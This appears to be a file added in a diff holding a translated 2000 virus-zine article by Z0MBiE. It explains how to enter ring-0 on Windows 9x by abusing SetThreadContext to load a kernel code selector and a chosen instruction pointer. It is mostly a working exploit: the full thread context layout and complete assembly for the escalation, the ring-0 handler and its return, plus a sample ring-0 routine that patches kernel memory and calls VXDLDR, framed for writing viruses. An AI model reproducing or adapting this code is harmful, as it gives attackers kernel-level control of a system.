@@ -1,0 +1,162 @@
+
+           Entering Ring-0 Using Win32 Api: Context Modification
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+                  xlated from russian for MATRiX #2 E-Zine
+                              (x) 2000 Z0MBiE
+
+ When an operating system called "mustdie", this means at least something.
+ So, here it is - unknown, shocking method of entering ring-0 under win9X.
+
+ Patch of the system tables? Loading viral VxD? Bug in the system code?
+ Exploit? Perverted calls via kernel? - NO!
+ Just a standard, well-documented Win32 Api.
+
+ Idea is to call SetThreadContext function.
+ This function sets all the registers of the given thread.
+
+ Main feature (which and makes possible to enter ring-0) is that
+ code, that applies modified registers (in contrast to winNT/2000)
+ doesn't performs enough check of segment register values, so...
+
+ So, we're changing context.CS to 28h (ring0 selector), and context.EIP to
+ offset of our ring0 subroutine.
+
+ Now, more detailed.
+
+ At first step we need to get handle of the thread in whose context we
+ wanna to enter ring-0. Let it be current thread. So, we need to call
+ GetCurrentThread.
+
+ After that, we need to get context of that thread, i.e. to fill the
+ context structure with current register values.
+ This may be done by means of GetThreadContext.
+
+ But, before calling context-related functions, we need to organize context
+ structure. It is of 204 bytes length (0xCC) bytes, and, (this is important!)
+ first DWORD of this structure must be -1.
+ Using this DWORD as a bitset, context-managing functions will work with
+ selected registers.
+
+ Here is a complete context structure:
+
+thread_context_structure:
+c_contextflags          dd      -1
+c_dr0                   dd      ?
+c_dr1                   dd      ?
+c_dr2                   dd      ?
+c_dr3                   dd      ?
+c_dr6                   dd      ?
+c_dr7                   dd      ?
+c_fpu_controlword       dd      ?
+c_fpu_statusword        dd      ?
+c_fpu_tagword           dd      ?
+c_fpu_erroroffset       dd      ?
+c_fpu_errorselector     dd      ?
+c_fpu_dataoffset        dd      ?
+c_fpu_dataselector      dd      ?
+c_fpu_registerarea      db      80 dup (?)
+c_fpu_cr0npxstate       dd      ?
+c_gs                    dd      ?
+c_fs                    dd      ?
+c_es                    dd      ?
+c_ds                    dd      ?
+c_edi                   dd      ?
+c_esi                   dd      ?
+c_ebx                   dd      ?
+c_edx                   dd      ?
+c_ecx                   dd      ?
+c_eax                   dd      ?
+c_ebp                   dd      ?
+c_eip                   dd      ?
+c_cs                    dd      ?
+c_eflags                dd      ?
+c_esp                   dd      ?
+c_ss                    dd      ?
+
+ After we've filled context structure with all the shit
+ (via GetThreadContext) we must:
+ (1) save old CS and EIP for the future restoration, and
+ (2) change current CS and EIP.
+
+ After such harmful action, we're calling SetThreadContext function.
+ And at this moment happens glorious event we was waiting for.
+
+ Now, one more detailed.
+
+ Ring3 subroutine SetThreadContext passes control to the ring0 code.
+ This ring0 code changes all the registers selected by contextflags (-1),
+ including CS:EIP, and performs IRET.
+ But, on IRET control returns not back to kernel's SetThreadContext, but
+ to our CS:EIP, because these CS:EIP were just changed by ring0 code.
+
+ I need to say here, that if you will only set CS=28h leaving EIP unchanged,
+ control will return to kernel, but in ring0 mode. But kernel will anyway
+ use ring3 DS/ES/FS selectors, and it will fuckup system.
+
+ Well, if you understood nothing, anyway,
+ here is an example of entering ring0:
+
+callring0:              pusha
+                        enter   0C8h,0          ; context structure
+                        push    -1              ; contextflags = -1
+
+                        call    GetCurrentThread
+                        xchg    ebx, eax        ; EBX = thread handle
+
+                        push    esp             ; ESP = context structure
+                        push    ebx             ; EBX = thread handle
+                        call    GetThreadContext
+
+                        push    28h             ; save_cs = context.cs
+                        pop     eax             ; context.cs = 28h
+                        xchg    eax, [esp+0BCh]
+                        mov     save_cs, eax
+
+                        lea     eax, ring0code_caller
+                        xchg    eax, [esp+0B8h] ; save_eip = ctx.eip,
+                        mov     save_eip, eax   ; ctx.eip = @ring0code_caller
+
+                        push    esp             ; ESP = context structure
+                        push    ebx             ; EBX = thread handle
+                        call    SetThreadContext; call ring0
+                        ; back from ring-0
+
+                        pop     eax
+                        leave
+                        popa
+                        ret     ; callring0
+
+ring0code_caller:       mov     ss:save_esp, esp
+                        lea     esp, end_of_my_stack
+
+                        pushf
+                        pusha
+                        push    ds es
+
+                        push    ss ss           ; initialize DS/ES selectors
+                        pop     ds es           ; with 30h
+
+                        call    ring0
+
+                        pop     es ds
+                        popa
+                        popf
+
+                        mov     esp, ss:save_esp
+
+                        pushf
+                        push    ss:save_cs
+                        push    ss:save_eip
+                        iret                    ; return to kernel
+
+; this is YOUR ring-0 subroutine
+
+ring0:                  not     dword ptr ds:[0BFF70000h]
+                        VxDcall VXDLDR, GetDeviceList
+                        ...
+                        ret
+
+  Thats all!
+
+
